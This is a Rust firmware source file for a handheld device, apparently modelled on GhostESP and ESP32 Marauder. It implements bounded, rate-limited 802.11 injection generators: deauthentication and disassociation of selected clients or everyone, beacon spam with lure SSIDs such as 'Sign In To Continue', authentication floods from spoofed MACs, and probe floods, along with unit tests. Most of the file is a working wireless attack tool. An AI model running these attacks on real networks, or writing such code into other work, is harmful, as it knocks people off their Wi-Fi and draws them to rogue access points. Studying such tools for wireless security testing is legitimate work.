//! Bounded, cancellable 802.11 frame-injection state machines (G01 offensive tools).
//!
//! Reference behaviour comes from GhostESP `main/attacks/wifi/*` (deauth, beacon
//! spam, auth flood, probe flood) and ESP32 Marauder's injection paths. The Rust
//! design keeps every frame in a fixed buffer, paces transmission explicitly, and
//! exposes counters so the UI can show what was actually transmitted versus what
//! was requested.

use alloc::vec::Vec;

use crate::net::MacAddr;

use super::frame::{
    self, BeaconOptions, FrameBuffer, reason,
};

/// Injection modes supported by the CORE/FIELD Wi-Fi radio.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AttackMode {
    /// Deauthentication frames against selected clients (or broadcast).
    Deauth,
    /// Disassociation frames.
    Disassoc,
    /// Beacon frames with rotating SSIDs (rogue-AP visibility test).
    BeaconSpam,
    /// Authentication frames with rotating spoofed source addresses.
    AuthFlood,
    /// Probe requests with rotating SSIDs (client-tracking resilience test).
    ProbeFlood,
}

impl AttackMode {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Deauth => "Deauth Test",
            Self::Disassoc => "Disassoc Test",
            Self::BeaconSpam => "Beacon Spam",
            Self::AuthFlood => "Auth Flood",
            Self::ProbeFlood => "Probe Flood",
        }
    }

    /// Manifest hint shown when the radio refuses the operation.
    pub const fn needs_raw_tx(self) -> bool {
        true
    }
}

/// Cadence and limits for an injection run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct AttackPlan {
    pub mode: AttackMode,
    pub channel: u8,
    /// Minimum spacing between frames in microseconds (rate limit).
    pub interval_us: u32,
    /// Frames per burst; the runner pauses `burst_pause_us` between bursts.
    pub burst: u8,
    pub burst_pause_us: u32,
    pub reason: u16,
    /// Target every client instead of the selected list.
    pub broadcast: bool,
    /// Stop after this long; `0` means run until cancelled.
    pub duration_ms: u64,
    pub hidden_ssid: bool,
    pub wpa2_lookalike: bool,
}

impl AttackPlan {
    /// Conservative default: ~100 frames/s, 8-frame bursts, 100 ms pause.
    pub fn new(mode: AttackMode, channel: u8) -> Self {
        Self {
            mode,
            channel,
            interval_us: 10_000,
            burst: 8,
            burst_pause_us: 100_000,
            reason: reason::CLASS3_FROM_UNASSOC,
            broadcast: true,
            duration_ms: 0,
            hidden_ssid: false,
            wpa2_lookalike: false,
        }
    }

    /// Effective frames per second implied by the plan.
    pub fn frames_per_second(&self) -> u32 {
        if self.interval_us == 0 {
            return 0;
        }
        1_000_000 / self.interval_us
    }
}

/// What the runner produced this tick (the caller transmits `frame`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TxKind {
    Deauth,
    Disassoc,
    Beacon,
    Auth,
    Probe,
}

/// Small deterministic PRNG (xorshift64*) — reproducible tests, no entropy source
/// dependency, no allocation.
#[derive(Debug, Clone)]
pub struct Rng(u64);

impl Rng {
    pub const fn new(seed: u64) -> Self {
        Self(if seed == 0 { 0x9E37_79B9_7F4A_7C15 } else { seed })
    }

    pub fn next_u64(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }

    pub fn next_u8(&mut self) -> u8 {
        (self.next_u64() >> 33) as u8
    }

    pub fn below(&mut self, bound: usize) -> usize {
        if bound == 0 {
            0
        } else {
            (self.next_u64() % bound as u64) as usize
        }
    }

    /// Random, locally administered unicast MAC (avoids colliding with real OUIs).
    pub fn mac(&mut self) -> MacAddr {
        let value = self.next_u64().to_le_bytes();
        MacAddr([
            (value[0] & 0xFE) | 0x02,
            value[1],
            value[2],
            value[3],
            value[4],
            value[5],
        ])
    }

    /// Random SSID of 4..=16 printable characters.
    pub fn ssid(&mut self, out: &mut [u8; 32]) -> usize {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
        let len = 4 + self.below(13);
        for slot in out.iter_mut().take(len) {
            *slot = ALPHABET[self.below(ALPHABET.len())];
        }
        len
    }
}

/// SSIDs used by beacon spam. Generic public-hotspot style names (the same idea as
/// the reference implementations' SSID tables) so the tool is useful in a lab
/// without impersonating a specific operator.
pub const SPAM_SSIDS: &[&[u8]] = &[
    b"Free WiFi",
    b"Guest WiFi",
    b"Public Hotspot",
    b"Airport WiFi",
    b"Hotel Guest",
    b"Cafe WiFi",
    b"CyberDeck Lab",
    b"Network Setup",
    b"Update Required",
    b"Sign In To Continue",
    b"DIRECT-Setup",
    b"Home Network",
];

/// Long-running frame generator. Owns no radio; the firmware pulls frames and
/// transmits them, so pacing and cancellation stay testable and shared.
#[derive(Debug)]
pub struct AttackRunner {
    plan: AttackPlan,
    rng: Rng,
    targets: Vec<MacAddr>,
    bssids: Vec<MacAddr>,
    bssid: MacAddr,
    ssid: [u8; 32],
    ssid_len: usize,
    next_tx_us: u64,
    burst_left: u8,
    pause_until_us: u64,
    started_ms: u64,
    frames: u32,
    bursts: u32,
    target_cursor: usize,
    ssid_cursor: usize,
}

impl AttackRunner {
    pub fn new(plan: AttackPlan, seed: u64, started_ms: u64) -> Self {
        let mut rng = Rng::new(seed);
        let bssid = rng.mac();
        Self {
            plan,
            rng,
            targets: Vec::new(),
            bssids: Vec::new(),
            bssid,
            ssid: [0; 32],
            ssid_len: 0,
            next_tx_us: 0,
            burst_left: plan.burst.max(1),
            pause_until_us: 0,
            started_ms,
            frames: 0,
            // The runner starts inside its first burst.
            bursts: 1,
            target_cursor: 0,
            ssid_cursor: 0,
        }
    }

    pub fn plan(&self) -> &AttackPlan {
        &self.plan
    }

    pub fn frames(&self) -> u32 {
        self.frames
    }

    pub fn bursts(&self) -> u32 {
        self.bursts
    }

    /// Clients to target for deauth/disassoc.
    pub fn set_targets(&mut self, targets: &[MacAddr]) {
        self.targets.clear();
        self.targets.extend_from_slice(targets);
        self.target_cursor = 0;
    }

    /// APs to target (deauth BSSIDs / beacon-spam source).
    pub fn set_bssids(&mut self, bssids: &[MacAddr]) {
        self.bssids.clear();
        self.bssids.extend_from_slice(bssids);
        self.target_cursor = 0;
    }

    /// True when the plan's duration elapsed.
    pub fn should_stop(&self, now_ms: u64) -> bool {
        self.plan.duration_ms != 0 && now_ms.saturating_sub(self.started_ms) >= self.plan.duration_ms
    }

    /// Produce the next frame if the cadence allows it.
    pub fn next_frame(&mut self, now_us: u64, out: &mut FrameBuffer) -> Option<TxKind> {
        if now_us < self.next_tx_us {
            return None;
        }
        if self.burst_left == 0 {
            // Inter-burst pause is measured from the last frame of the previous
            // burst; the poll that lands on its end transmits immediately.
            if now_us < self.pause_until_us {
                return None;
            }
            self.burst_left = self.plan.burst.max(1);
            self.bursts = self.bursts.saturating_add(1);
        }

        let kind = match self.plan.mode {
            AttackMode::Deauth => {
                let (dst, bssid) = self.pick_pair();
                *out = frame::deauth_frame(dst, bssid, self.plan.reason);
                TxKind::Deauth
            }
            AttackMode::Disassoc => {
                let (dst, bssid) = self.pick_pair();
                *out = frame::disassoc_frame(dst, bssid, self.plan.reason);
                TxKind::Disassoc
            }
            AttackMode::BeaconSpam => {
                self.rotate_beacon_identity();
                let options = BeaconOptions {
                    channel: self.plan.channel,
                    privacy: self.plan.wpa2_lookalike,
                    wpa2: self.plan.wpa2_lookalike,
                    hidden: self.plan.hidden_ssid,
                    interval: 100,
                    sequence: (self.frames & 0x0FFF) as u16,
                };
                *out = frame::beacon_frame(&self.ssid[..self.ssid_len], self.bssid, &options);
                TxKind::Beacon
            }
            AttackMode::AuthFlood => {
                let bssid = self.pick_bssid();
                let source = self.rng.mac();
                *out = frame::auth_frame(bssid, source, bssid, 0, 1, 0);
                TxKind::Auth
            }
            AttackMode::ProbeFlood => {
                let source = self.rng.mac();
                if self.plan.hidden_ssid {
                    *out = frame::probe_request(source, None);
                } else {
                    let mut ssid = [0u8; 32];
                    let len = self.rng.ssid(&mut ssid);
                    *out = frame::probe_request(source, Some(&ssid[..len]));
                }
                TxKind::Probe
            }
        };

        self.frames = self.frames.saturating_add(1);
        self.burst_left = self.burst_left.saturating_sub(1);
        self.next_tx_us = now_us + u64::from(self.plan.interval_us);
        if self.burst_left == 0 {
            self.pause_until_us = now_us + u64::from(self.plan.burst_pause_us);
        }
        Some(kind)
    }

    fn pick_bssid(&mut self) -> MacAddr {
        if self.bssids.is_empty() {
            return self.bssid;
        }
        let bssid = self.bssids[self.target_cursor % self.bssids.len()];
        self.target_cursor = self.target_cursor.wrapping_add(1);
        bssid
    }

    fn pick_pair(&mut self) -> (MacAddr, MacAddr) {
        let bssid = self.pick_bssid();
        if self.plan.broadcast || self.targets.is_empty() {
            return (MacAddr::BROADCAST, bssid);
        }
        let dst = self.targets[self.target_cursor % self.targets.len()];
        self.target_cursor = self.target_cursor.wrapping_add(1);
        (dst, bssid)
    }

    fn rotate_beacon_identity(&mut self) {
        if self.frames % 4 == 0 {
            self.bssid = self.rng.mac();
        }
        if self.ssid_len == 0 || self.frames % 8 == 0 {
            // Half the time use a realistic public SSID, half a random one: the
            // rotating pair is what the reference beacon-spam tools transmit.
            if self.rng.below(2) == 0 {
                let candidate = SPAM_SSIDS[self.ssid_cursor % SPAM_SSIDS.len()];
                self.ssid_cursor = self.ssid_cursor.wrapping_add(1);
                self.ssid_len = candidate.len().min(self.ssid.len());
                self.ssid[..self.ssid_len].copy_from_slice(&candidate[..self.ssid_len]);
            } else {
                let mut buf = [0u8; 32];
                let len = self.rng.ssid(&mut buf);
                self.ssid[..len].copy_from_slice(&buf[..len]);
                self.ssid_len = len;
            }
        }
    }
}

/// Static capability statement for the SAE/WPA3 research paths.
///
/// SAE commit frames require a P-256 scalar-multiplication state machine plus the
/// anti-clogging token exchange. Neither `esp-radio` 1.0 nor `esp-hal` 1.2 exposes
/// the required primitives, and a hand-rolled curve implementation would be
/// unverified cryptographic code on a device with no hardware RNG guarantees.
/// This is therefore a *named SDK limitation*, not a scheduling choice, and it is
/// reported on device as "Requires Different Firmware Support".
pub const SAE_SUPPORT: Option<&str> = None;

/// Explanation shown by the UI when SAE tooling is requested.
pub fn sae_support() -> &'static str {
    "SAE/WPA3 commit injection requires a P-256 SAE state machine that the \
     selected radio stack does not expose. WPA3 discovery, PMF detection and \
     handshake capture of WPA2/WPA3-transition networks remain available."
}

#[cfg(test)]
mod tests {
    use super::*;

    fn runner(mode: AttackMode) -> AttackRunner {
        AttackRunner::new(AttackPlan::new(mode, 6), 0xC0FFEE, 0)
    }

    #[test]
    fn deauth_respects_interval_and_counters() {
        let mut runner = runner(AttackMode::Deauth);
        let mut frame = FrameBuffer::new();
        assert!(runner.next_frame(0, &mut frame).is_some());
        let first = frame.as_slice().to_vec();
        // Too early: nothing emitted.
        assert!(runner.next_frame(5_000, &mut frame).is_none());
        assert!(runner.next_frame(10_000, &mut frame).is_some());
        assert_eq!(runner.frames(), 2);
        assert_eq!(first.len(), 26);
        assert_eq!(u16::from_le_bytes([first[0], first[1]]), 0x00C0);
    }

    #[test]
    fn burst_pauses_after_configured_frames() {
        let mut plan = AttackPlan::new(AttackMode::BeaconSpam, 1);
        plan.burst = 2;
        plan.burst_pause_us = 50_000;
        let mut runner = AttackRunner::new(plan, 7, 0);
        let mut frame = FrameBuffer::new();
        assert!(runner.next_frame(0, &mut frame).is_some());
        assert!(runner.next_frame(10_000, &mut frame).is_some());
        // Third frame is held back by the burst pause (50 ms from the burst end).
        assert!(runner.next_frame(20_000, &mut frame).is_none());
        assert_eq!(runner.frames(), 2);
        assert_eq!(runner.bursts(), 1);
        assert!(runner.next_frame(59_999, &mut frame).is_none());
        assert!(runner.next_frame(60_000, &mut frame).is_some());
        assert_eq!(runner.bursts(), 2);
        assert_eq!(runner.frames(), 3);
    }

    #[test]
    fn deauth_targets_selected_clients_only() {
        let mut plan = AttackPlan::new(AttackMode::Deauth, 6);
        plan.broadcast = false;
        let mut runner = AttackRunner::new(plan, 1, 0);
        let ap = MacAddr::parse("00:11:22:33:44:55").unwrap();
        let client = MacAddr::parse("02:AA:BB:CC:DD:EE").unwrap();
        runner.set_bssids(&[ap]);
        runner.set_targets(&[client]);
        let mut frame = FrameBuffer::new();
        runner.next_frame(0, &mut frame).unwrap();
        assert_eq!(&frame.as_slice()[4..10], client.as_bytes());
        assert_eq!(&frame.as_slice()[10..16], ap.as_bytes());
    }

    #[test]
    fn beacon_spam_rotates_identity_and_keeps_valid_frames() {
        let mut runner = runner(AttackMode::BeaconSpam);
        let mut frame = FrameBuffer::new();
        let mut seen = alloc::collections::BTreeSet::new();
        for i in 0..32u64 {
            if runner.next_frame(i * 10_000, &mut frame).is_some() {
                let header = frame::FrameHeader::parse(frame.as_slice()).expect("valid beacon");
                assert_eq!(header.fc.subtype, frame::subtype::BEACON);
                assert_eq!(frame::find_channel(header.ies()), Some(6));
                seen.insert(frame.as_slice()[10..16].to_vec());
            }
        }
        assert!(seen.len() > 1, "BSSID should rotate");
    }

    #[test]
    fn auth_flood_uses_randomised_locally_administered_sources() {
        let mut runner = runner(AttackMode::AuthFlood);
        let mut frame = FrameBuffer::new();
        let mut frames = 0;
        for i in 0..16u64 {
            if runner.next_frame(i * 10_000, &mut frame).is_some() {
                let header = frame::FrameHeader::parse(frame.as_slice()).unwrap();
                assert_eq!(header.fc.subtype, frame::subtype::AUTH);
                assert!(header.addr2.is_locally_administered());
                assert!(header.addr2.is_multicast() == false);
                frames += 1;
            }
        }
        assert!(frames >= 8);
    }

    #[test]
    fn duration_limit_stops_the_run() {
        let mut plan = AttackPlan::new(AttackMode::ProbeFlood, 1);
        plan.duration_ms = 500;
        let runner = AttackRunner::new(plan, 3, 1_000);
        assert!(!runner.should_stop(1_400));
        assert!(runner.should_stop(1_500));
    }

    #[test]
    fn rng_is_deterministic_for_seed() {
        let mut a = Rng::new(42);
        let mut b = Rng::new(42);
        for _ in 0..8 {
            assert_eq!(a.next_u64(), b.next_u64());
        }
        let mut rng = Rng::new(9);
        let mac = rng.mac();
        assert!(mac.is_locally_administered());
        assert!(!mac.is_multicast());
    }

    #[test]
    fn sae_limitation_is_explicit() {
        assert!(SAE_SUPPORT.is_none());
        assert!(sae_support().contains("P-256"));
    }
}
